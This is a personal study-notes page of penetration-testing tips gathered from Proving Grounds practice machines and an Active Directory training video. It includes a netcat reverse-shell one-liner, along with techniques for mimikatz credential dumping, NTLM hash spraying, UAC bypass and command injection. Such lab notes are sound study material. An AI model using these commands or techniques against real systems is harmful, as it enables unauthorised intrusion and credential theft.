---
description: >-
  Things I noticed after my first failed attempt referring to more walkthroughs
  of PG boxes and AD
---

# Cool Stuff I Found

**Rookie Mistake - PGP**

* JWT token secrets can be cracked by john: SSTI \[copy entire hash as is]
* Run nested revshells using `&` at the end of revshell payload - makes it run in background, amazing for cases where the exploit may be tedious\
  `nc -e /bin/bash $ip $port &`
* Before jumping to command execution, try to see if error message gives info about command being run in the first place, it may give better hints

**Sorcerer - PGP**

* SSH -O option to use legacy version instead of sftp for file too long or other errors

**AD Offsec Youtube**

{% embed url="https://www.youtube.com/watch?v=2NLi4wzAvTw" %}

* EventViewer-UACBypass alternative for RunasCS.ps1 where we don't have creds, perfect for revshell environments (Run revshell via cmd /c or directly call path to rev.exe)
* WinPEAS after admin shows all logged on users in case you feel you might be missing on loot (from lsadump::cache too we've never used that so nice clock)&#x20;
* Try same NTLM hash of local admin on other systems too (-lsa to dump secrets with same command)
* Interactive shell always, evil-winrm is just for file transfer - look at the **double hop kerberos issue**
* Logon Server in sekurlsa:logonpasswords shows which system that user actlly logged in to

So, here's the bait I believe

We found user creds from mimikatz for another user (tris) and normally we'd zoom by but here after local admin hash spraying, we found it worked for another system and found another pair of creds (pete)

In the end pete wasn't required and tris was admin on another system that had DA creds from mimi

{% embed url="https://github.com/CsEnox/EventViewer-UACBypass" %}

#### XposedAPI

* Command injection must be tried with and without breaking the intended logic of the command (eg. curl command our file server should be offline and try to execute revshell payload)

#### FIsh

* Directory Traversal + Directory Listing = Path Traversal (WOW)

#### Roquefort

* Port 80 might not work for python web server file serving, also might have to revert after a failed exploit attempt
* Direct revshell in RCE didn't work, had to transfer a shell file and then exec

#### Billyboss

* When you need creds to proceed, Seclists' `default_passwords.csv` is a great option before bruteforcing

#### Marketing

* If you know the play is to find subdomain, grep master domain in source (grep "marketing.pg")
* Run linpeas again after getting new user, new files may be accessible that weren't before
* Didn't check my groups - the mlocate.db which was accessible via our group had the info
* Lacked in bash thought it was checking file content instead of the name and `-z`

#### Moral of the Story

* ENUMERATE ENUMERATE ENUMERATE
* SPRAY SPRAY SPRAY - there are no artefacts in the actual exam do not assume anything
